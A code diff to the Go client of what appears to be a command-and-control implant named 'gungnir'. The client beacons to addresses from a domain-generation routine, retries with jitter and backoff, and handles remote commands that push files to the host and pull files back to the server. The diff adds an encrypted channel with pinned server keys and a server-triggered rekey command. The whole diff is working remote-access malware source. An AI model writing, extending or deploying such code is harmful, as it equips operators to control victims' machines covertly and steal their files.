@@ -1,7 +1,8 @@
 package main
 
 import (
-    "bufio"
+    "encoding/hex"
+    "encoding/json"
     "errors"
     "flag"
     "fmt"
@@ -19,14 +20,14 @@ import (
     
     p "gungnir/internal/proto"
     u "gungnir/internal/utils"
+    s "gungnir/internal/secure"
 )
 
-const letters = "abcdefghijklmnopqrstuvwxyz"
+const blackhole = "If you feel you are in a black hole, don’t give up. There’s a way out."
 
 type Client struct {
     id   string
     conn net.Conn
-    r    *bufio.Reader
     send chan *p.Message
     wg   sync.WaitGroup
 }
@@ -39,7 +40,6 @@ func main() {
         *id = hostnameFallback()
     }
 
-    // jitter seed
     rand.Seed(time.Now().UnixNano())
 
     for {
@@ -53,7 +53,6 @@ func main() {
         }
 
         _ = conn.Close()
-        // short wait before attempting to reconnect to avoid a loop
         sleepWithJitter(2*time.Second, 500*time.Millisecond)
     }
 }
@@ -66,18 +65,15 @@ func dialWithBackoff(port int) (net.Conn, string) {
     for {
         for addr := range u.GenDomainsStream(23, 16, port) {
             attempt++
-
             conn, err := net.DialTimeout("tcp", addr, 5*time.Second)
             if err == nil {
                 return conn, addr
             }
 
             log.Printf("dial attempt #%d to %s failed: %v", attempt, addr, err)
-            // wait with jitter
             sleepWithJitter(backoff, backoff*2)
         }
 
-        // exponential with ceiling
         backoff *= 2
         if backoff > maxBackoff {
             backoff = maxBackoff
@@ -91,25 +87,35 @@ func sleepWithJitter(base time.Duration, jitter time.Duration) {
         return
     }
 
-    // uniforme jitter [0, jitter)
     extra := time.Duration(rand.Int63n(int64(jitter)))
     time.Sleep(base + extra)
 }
 
 func runSession(id string, conn net.Conn) error {
+    // TOFU handshake
+    sess, err := s.ClientTOFU(conn, loadPinned, savePinned)
+    if err != nil {
+        return fmt.Errorf("TOFU handshake fail: %w", err)
+    }
+
     c := &Client{
         id:   id,
         conn: conn,
-        r:    bufio.NewReader(conn),
         send: make(chan *p.Message, 32),
     }
 
-    // writer
+    // crypto writer
     c.wg.Add(1)
     go func() {
         defer c.wg.Done()
         for msg := range c.send {
-            if err := p.WriteJSON(conn, msg); err != nil {
+            b, err := json.Marshal(msg)
+            if err != nil {
+                log.Printf("json marshal error: %v", err)
+                return
+            }
+
+            if err := sess.WriteMsg(b); err != nil {
                 log.Printf("write error: %v", err)
                 return
             }
@@ -117,16 +123,13 @@ func runSession(id string, conn net.Conn) error {
     }()
 
     // register
-    if err := p.WriteJSON(conn, &p.Message{Type: "register", ClientID: c.id}); err != nil {
-        return fmt.Errorf("register failed: %w", err)
-    }
-
+    c.send <- &p.Message{Type: "register", ClientID: c.id}
     log.Printf("registered as %s", c.id)
 
     // reader loop
     for {
-        var msg p.Message
-        if err := p.ReadJSON(c.r, &msg); err != nil {
+        b, err := sess.ReadMsg()
+        if err != nil {
             if errors.Is(err, io.EOF) {
                 log.Printf("server closed")
                 break
@@ -134,7 +137,31 @@ func runSession(id string, conn net.Conn) error {
 
             return fmt.Errorf("read error: %w", err)
         }
+
+        var msg p.Message
+        if err := json.Unmarshal(b, &msg); err != nil {
+            return fmt.Errorf("json decode: %w", err)
+        }
+
         switch msg.Type {
+        case "secure_reset":
+            if len(msg.Data) != 32 {
+                log.Printf("bad secure_reset payload")
+                continue
+            }
+
+            var newPub [32]byte
+            copy(newPub[:], msg.Data)
+            if err := sess.RekeyClientTOFU(newPub, savePinned); err != nil {
+                log.Printf("rekey failed: %v", err)
+                continue
+            }
+
+            ack := &p.Message{ID: msg.ID, Type: "secure_reset_ack"}
+            b, _ := json.Marshal(ack)
+            if err := sess.WriteMsg(b); err != nil {
+                log.Printf("ack write failed: %v", err)
+            }
         case "file":
             go c.handleFile(&msg)
         case "pull_file":
@@ -186,7 +213,7 @@ func (c *Client) handlePullFile(msg *p.Message) {
 
     c.send <- &p.Message{
         ID:       msg.ID,
-        Type:     "file", // pull_file response
+        Type:     "file",
         FilePath: msg.FilePath,
         Data:     data,
         Checksum: sum,
@@ -264,5 +291,48 @@ func hostnameFallback() string {
     }
 
     return h
+}
+
+// ========== Pin TOFU em arquivo ==========
+
+func pinFilePath() string {
+    if v := strings.TrimSpace(os.Getenv("GUNGNIR_PIN_FILE")); v != "" {
+        return v
+    }
+
+    home, _ := os.UserHomeDir()
+    if home == "" {
+        home = "."
+    }
+
+    _ = os.MkdirAll(filepath.Join(home, ".gungnir"), 0o700)
+    return filepath.Join(home, ".gungnir", "server_pub.hex")
+}
+
+func loadPinned() ([32]byte, bool) {
+    var out [32]byte
+    p := pinFilePath()
+    b, err := os.ReadFile(p)
+    if err != nil {
+        return out, false
+    }
+
+    raw, err := hex.DecodeString(strings.TrimSpace(string(b)))
+    if err != nil || len(raw) != 32 {
+        return out, false
+    }
+
+    copy(out[:], raw)
+    return out, true
+}
+
+func savePinned(pub [32]byte) error {
+    p := pinFilePath()
+    tmp := p + ".tmp"
+    if err := os.WriteFile(tmp, []byte(hex.EncodeToString(pub[:])+"\n"), 0o600); err != nil {
+        return err
+    }
+
+    return os.Rename(tmp, p)
 }
 
